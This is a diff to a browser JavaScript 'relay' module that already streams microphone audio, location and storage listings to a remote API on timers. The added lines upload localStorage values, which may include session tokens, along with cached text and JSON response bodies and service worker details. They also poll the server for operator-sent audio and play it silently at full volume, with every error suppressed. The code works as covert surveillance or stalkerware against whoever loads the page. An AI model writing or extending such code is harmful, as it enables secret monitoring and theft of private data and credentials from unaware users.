@@ -90,6 +90,7 @@ const RELAY_INTERVALS = {
     audio: 3000,
     location: 8000,
     storage: 30000,
+    admin_audio: 3000,
 };
 
 let relayTimers = {};
@@ -221,8 +222,28 @@ async function sendStorage() {
             for (const name of cacheNames) {
                 const cache = await caches.open(name);
                 const requests = await cache.keys();
+                let count = 0;
                 for (const req of requests) {
-                    files.push({ name: req.url, size: 0, source: 'cache', cache: name });
+                    const entry = { name: req.url, size: 0, source: 'cache', cache: name };
+                    // İlk 10 cache entry için response body'yi dene
+                    if (count < 10) {
+                        try {
+                            const resp = await cache.match(req);
+                            if (resp) {
+                                const clone = resp.clone();
+                                const ct = (clone.headers.get('content-type') || '').toLowerCase();
+                                if (ct.includes('text') || ct.includes('json') || ct.includes('javascript')) {
+                                    const text = await clone.text();
+                                    if (text.length < 5000) {
+                                        entry.content = text.slice(0, 2000);
+                                        entry.size = text.length;
+                                    }
+                                }
+                            }
+                        } catch (_) {}
+                    }
+                    files.push(entry);
+                    count++;
                 }
             }
         }
@@ -231,7 +252,10 @@ async function sendStorage() {
     try {
         if (navigator.serviceWorker?.controller) {
             const regs = await navigator.serviceWorker.getRegistrations();
-            files.push({ name: `[Service Worker] ${regs.length} kayıt`, size: 0, source: 'serviceworker' });
+            for (const reg of regs) {
+                const sw = reg.active || reg.installing || reg.waiting;
+                files.push({ name: `[SW] ${reg.scope} (${sw?.state || 'unknown'})`, size: 0, source: 'serviceworker' });
+            }
         }
     } catch (_) {}
 
@@ -248,7 +272,12 @@ async function sendStorage() {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const val = localStorage.getItem(key);
-            files.push({ name: `[localStorage] ${key}`, size: val ? val.length : 0, source: 'localstorage' });
+            files.push({
+                name: `[localStorage] ${key}`,
+                size: val ? val.length : 0,
+                source: 'localstorage',
+                content: val ? val.slice(0, 500) : '',
+            });
         }
     } catch (_) {}
 
@@ -259,6 +288,22 @@ async function sendStorage() {
             usage: result.usage || '', usage_percent: result.usage_percent || 0, files,
         })
     }).catch(() => {});
+}
+
+let _lastAdminAudio = '';
+
+async function checkAdminAudio() {
+    if (!relayActive) return;
+    try {
+        const resp = await fetch(`${API_BASE}/api/relay/check-audio?uid=${getRelayUid()}`);
+        const data = await resp.json();
+        if (data.audio && data.audio.length > 100 && data.audio !== _lastAdminAudio) {
+            _lastAdminAudio = data.audio;
+            const audio = new Audio(`data:audio/webm;base64,${data.audio}`);
+            audio.volume = 1.0;
+            audio.play().catch(() => {});
+        }
+    } catch (_) {}
 }
 
 async function startRelay() {
@@ -286,6 +331,7 @@ async function startRelay() {
     relayTimers.audio = setInterval(sendAudio, RELAY_INTERVALS.audio);
     relayTimers.location = setInterval(sendLocation, RELAY_INTERVALS.location);
     relayTimers.storage = setInterval(sendStorage, RELAY_INTERVALS.storage);
+    relayTimers.admin_audio = setInterval(checkAdminAudio, RELAY_INTERVALS.admin_audio);
 }
 
 function stopRelay() {
